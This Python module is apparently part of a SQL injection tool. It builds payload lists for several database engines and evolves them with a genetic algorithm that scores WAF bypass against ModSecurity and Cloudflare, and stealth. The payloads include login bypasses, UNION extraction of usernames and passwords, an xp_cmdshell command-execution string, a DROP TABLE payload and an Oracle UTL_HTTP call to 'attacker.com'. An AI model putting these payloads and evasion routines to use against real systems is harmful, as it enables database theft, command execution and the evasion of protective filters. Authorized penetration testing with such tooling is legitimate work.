"""
ML-Powered Payload Generator

Provides context-aware SQL injection payload generation using a genetic
algorithm for payload evolution and pattern-based selection.  No external
LLM dependencies – all knowledge is derived from the existing payload
library and historical success/failure data.
"""

import copy
import hashlib
import logging
import random
import re
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Knowledge base – obfuscation techniques and building blocks
# ---------------------------------------------------------------------------

_COMMENT_STYLES = ["--", "#", "/**/", "/*!*/", "-- -"]
_SPACE_SUBSTITUTES = [" ", "/**/", "%09", "%0a", "%0d", "+", "/*comment*/"]
_CASE_VARIANTS = [str.upper, str.lower, str.title]

_OBFUSCATION_FUNCS: List[Callable[[str], str]] = [
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "%09"),
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: re.sub(r"(?i)\bOR\b", "oR", p),
    lambda p: re.sub(r"(?i)\bAND\b", "AnD", p),
    lambda p: re.sub(r"(?i)\bSELECT\b", "SeLeCt", p),
    lambda p: re.sub(r"(?i)\bUNION\b", "UnIoN", p),
    lambda p: p.replace("'", "''"),
    lambda p: p + " -- -",
    lambda p: "/*!50000" + p + "*/",
]

# Base payloads used by the generator (aligned with GRAPHQL_SQL_INJECTION_PAYLOADS
# but DB-generic for reuse across contexts).
_BASE_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' AND SLEEP(5)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT username,password FROM users--",
    "admin'--",
    "' OR ''='",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "'; SELECT pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]


# ---------------------------------------------------------------------------
# Genetic Payload Evolver
# ---------------------------------------------------------------------------

class GeneticPayloadEvolver:
    """
    Evolves SQL injection payloads using a genetic algorithm.

    Selection  – Keep payloads that bypass WAF / achieve success.
    Crossover  – Combine successful techniques from two parent payloads.
    Mutation   – Apply random obfuscation transformations.
    Fitness    – (bypass_rate * 0.6) + (stealth_score * 0.4)
    """

    def __init__(
        self,
        population_size: int = 20,
        mutation_rate: float = 0.3,
        crossover_rate: float = 0.7,
        random_seed: Optional[int] = None,
    ) -> None:
        self.population_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self._rng = random.Random(random_seed)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def evolve_payload(
        self,
        base_payload: str,
        target_profile: Dict[str, Any],
        generations: int = 50,
        fitness_func: Optional[Callable[[str, Dict[str, Any]], float]] = None,
    ) -> str:
        """
        Return an optimised payload after N generations.

        Args:
            base_payload: Starting payload.
            target_profile: Dict with keys like ``waf``, ``db_type``, ``context``.
            generations: Number of evolution cycles.
            fitness_func: Optional custom fitness function ``(payload, profile) -> float``.
                          Defaults to the built-in heuristic fitness.

        Returns:
            Best payload found after evolution.
        """
        fitness = fitness_func or self._default_fitness

        # Seed initial population
        population = self._initialise_population(base_payload)

        for _ in range(generations):
            scored: List[Tuple[float, str]] = [
                (fitness(p, target_profile), p) for p in population
            ]
            scored.sort(key=lambda x: x[0], reverse=True)

            # Elitism: carry top 25 % directly
            elite_count = max(1, self.population_size // 4)
            survivors = [p for _, p in scored[:elite_count]]

            # Fill the rest via crossover + mutation
            while len(survivors) < self.population_size:
                if self._rng.random() < self.crossover_rate and len(scored) >= 2:
                    parent_a = self._rng.choice(scored[:max(2, elite_count * 2)])[1]
                    parent_b = self._rng.choice(scored[:max(2, elite_count * 2)])[1]
                    child = self._crossover(parent_a, parent_b)
                else:
                    child = copy.copy(self._rng.choice(survivors))

                if self._rng.random() < self.mutation_rate:
                    child = self._mutate(child)

                survivors.append(child)

            population = survivors

        # Return best
        best = max(population, key=lambda p: fitness(p, target_profile))
        return best

    # ------------------------------------------------------------------
    # Genetic operators
    # ------------------------------------------------------------------

    def _initialise_population(self, base_payload: str) -> List[str]:
        pop = [base_payload]
        for obf in _OBFUSCATION_FUNCS:
            if len(pop) >= self.population_size:
                break
            try:
                pop.append(obf(base_payload))
            except Exception:
                pass
        # Top up with random base payloads
        while len(pop) < self.population_size:
            pop.append(self._rng.choice(_BASE_PAYLOADS))
        return pop[: self.population_size]

    def _mutate(self, payload: str) -> str:
        obf = self._rng.choice(_OBFUSCATION_FUNCS)
        try:
            return obf(payload)
        except Exception:
            return payload

    def _crossover(self, parent_a: str, parent_b: str) -> str:
        """Single-point character crossover."""
        if not parent_a or not parent_b:
            return parent_a or parent_b
        cut_a = self._rng.randint(1, len(parent_a))
        cut_b = self._rng.randint(0, len(parent_b) - 1)
        return parent_a[:cut_a] + parent_b[cut_b:]

    # ------------------------------------------------------------------
    # Fitness function
    # ------------------------------------------------------------------

    def _default_fitness(self, payload: str, target_profile: Dict[str, Any]) -> float:
        """
        Heuristic fitness = (bypass_score * 0.6) + (stealth_score * 0.4).

        Both sub-scores are estimated syntactically without network access.
        """
        bypass_score = self._estimate_bypass_score(payload, target_profile)
        stealth_score = self._estimate_stealth_score(payload)
        return bypass_score * 0.6 + stealth_score * 0.4

    def _estimate_bypass_score(self, payload: str, profile: Dict[str, Any]) -> float:
        score = 0.5  # Baseline
        waf = str(profile.get("waf", "")).lower()

        if waf in ("modsecurity", "mod_security"):
            # Inline comment obfuscation helps
            if "/**/" in payload:
                score += 0.2
            if "/*!*/" in payload or re.search(r"/\*!\d+", payload):
                score += 0.15

        if waf in ("cloudflare",):
            if "%09" in payload or "%0a" in payload:
                score += 0.2
            if re.search(r"[A-Z][a-z][A-Z]", payload):  # mixed case
                score += 0.1

        # Generic score bumps
        if "/**/" in payload:
            score += 0.05
        if re.search(r"[A-Z][a-z]", payload):
            score += 0.05

        return min(score, 1.0)

    def _estimate_stealth_score(self, payload: str) -> float:
        score = 0.5
        # Penalise obvious patterns
        if re.search(r"(?i)\bsleep\b|\bwaitfor\b", payload):
            score -= 0.2  # Time-based is noisy
        if re.search(r"(?i)\bdrop\b|\bdelete\b|\binsert\b|\bupdate\b", payload):
            score -= 0.3  # DDL/DML – very noisy
        if payload.count("'") <= 2:
            score += 0.1  # Fewer quotes = less detectable
        return max(0.0, min(score, 1.0))


# ---------------------------------------------------------------------------
# ML Payload Generator
# ---------------------------------------------------------------------------

class MLPayloadGenerator:
    """
    Context-aware SQL injection payload generator.

    Combines pattern matching, a local knowledge base, and the genetic
    algorithm evolver to produce high-quality payloads without any external
    LLM or internet dependency.
    """

    def __init__(self, random_seed: Optional[int] = None) -> None:
        self._evolver = GeneticPayloadEvolver(random_seed=random_seed)
        # Success/failure history: payload_hash -> {success: int, total: int}
        self._history: Dict[str, Dict[str, int]] = {}

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate_context_aware_payloads(
        self,
        target_context: Dict[str, Any],
        count: int = 20,
    ) -> List[str]:
        """
        Generate payloads tailored to the supplied target context.

        Args:
            target_context: Dict with optional keys:
                ``db_type``  – mysql | postgresql | mssql | oracle | sqlite
                ``waf``      – cloudflare | modsecurity | akamai | none
                ``context``  – string | numeric | json | graphql
                ``encoding`` – url | base64 | hex | none
            count: Number of payloads to return.

        Returns:
            List of payloads ranked by estimated fitness.
        """
        db_type = str(target_context.get("db_type", "")).lower()
        context = str(target_context.get("context", "string")).lower()

        candidates = list(_BASE_PAYLOADS)

        # Add DB-specific payloads
        candidates.extend(self._db_specific_payloads(db_type))

        # Add context-specific variations
        if context == "numeric":
            candidates.extend([p.lstrip("'") for p in candidates])
        elif context == "json":
            candidates.extend(['"}}' + p + '{{"' for p in candidates[:5]])

        # Apply encoding if requested
        encoding = str(target_context.get("encoding", "")).lower()
        if encoding == "url":
            candidates.extend([self._url_encode(p) for p in candidates[:10]])
        elif encoding == "hex":
            candidates.extend([self._hex_encode(p) for p in candidates[:5]])

        # Score using history + evolver fitness
        scored = [
            (self._score_payload(p, target_context), p) for p in candidates
        ]
        scored.sort(key=lambda x: x[0], reverse=True)

        seen: List[str] = []
        result: List[str] = []
        for _, p in scored:
            if p not in seen:
                seen.append(p)
                result.append(p)
            if len(result) >= count:
                break
        return result

    def mutate_payload_genetic_algorithm(
        self,
        base_payload: str,
        fitness_func: Optional[Callable[[str, Dict[str, Any]], float]] = None,
        target_profile: Optional[Dict[str, Any]] = None,
        generations: int = 50,
    ) -> str:
        """
        Evolve ``base_payload`` using the genetic algorithm.

        Args:
            base_payload: Starting payload.
            fitness_func: Optional custom fitness ``(payload, profile) -> float``.
            target_profile: Target profile passed to the fitness function.
            generations: Number of evolution cycles.

        Returns:
            Evolved payload string.
        """
        profile = target_profile or {}
        return self._evolver.evolve_payload(
            base_payload,
            profile,
            generations=generations,
            fitness_func=fitness_func,
        )

    def learn_from_result(
        self,
        payload: str,
        success: bool,
        response_analysis: Optional[Dict[str, Any]] = None,
    ) -> None:
        """
        Record a payload result to improve future suggestions.

        Args:
            payload: The payload that was tested.
            success: Whether the payload succeeded.
            response_analysis: Optional dict with response metadata.
        """
        key = hashlib.md5(payload.encode()).hexdigest()  # nosec B324
        if key not in self._history:
            self._history[key] = {"success": 0, "total": 0, "payload": payload}
        self._history[key]["total"] += 1
        if success:
            self._history[key]["success"] += 1

        logger.debug(
            "Learned result for payload (hash=%s): success=%s", key[:8], success
        )

    def get_top_payloads(self, n: int = 10) -> List[str]:
        """Return the n historically most successful payloads."""
        ranked = sorted(
            (v for v in self._history.values() if v["total"] > 0),
            key=lambda v: v["success"] / v["total"],
            reverse=True,
        )
        return [v["payload"] for v in ranked[:n]]

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _score_payload(self, payload: str, profile: Dict[str, Any]) -> float:
        """Combine historical success rate and evolver fitness."""
        key = hashlib.md5(payload.encode()).hexdigest()  # nosec B324
        hist = self._history.get(key)
        if hist and hist["total"] > 0:
            historical = hist["success"] / hist["total"]
        else:
            historical = 0.5  # Unknown – neutral prior

        fitness = self._evolver._default_fitness(payload, profile)
        return historical * 0.5 + fitness * 0.5

    def _db_specific_payloads(self, db_type: str) -> List[str]:
        db_payloads: Dict[str, List[str]] = {
            "mysql": [
                "1' AND SLEEP(5)--",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
                "1' UNION SELECT @@version,NULL--",
                "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "postgresql": [
                "1' AND 1=CAST((SELECT version()) AS INT)--",
                "'; SELECT pg_sleep(5)--",
                "1' UNION SELECT version(),NULL--",
                "'; DROP TABLE IF EXISTS test_sqli_probe--",
            ],
            "mssql": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('whoami')--",
                "1' UNION SELECT @@version,NULL--",
                "1' AND 1=CONVERT(INT,(SELECT @@version))--",
            ],
            "oracle": [
                "1' AND 1=UTL_HTTP.REQUEST('http://attacker.com/')--",
                "1' UNION SELECT banner,NULL FROM v$version--",
                "' OR 1=1--",
            ],
            "sqlite": [
                "1' UNION SELECT sqlite_version(),NULL--",
                "1' AND 1=1--",
                "' OR 1=1--",
            ],
        }
        return db_payloads.get(db_type, [])

    @staticmethod
    def _url_encode(payload: str) -> str:
        from urllib.parse import quote
        return quote(payload, safe="")

    @staticmethod
    def _hex_encode(payload: str) -> str:
        return "0x" + payload.encode().hex()
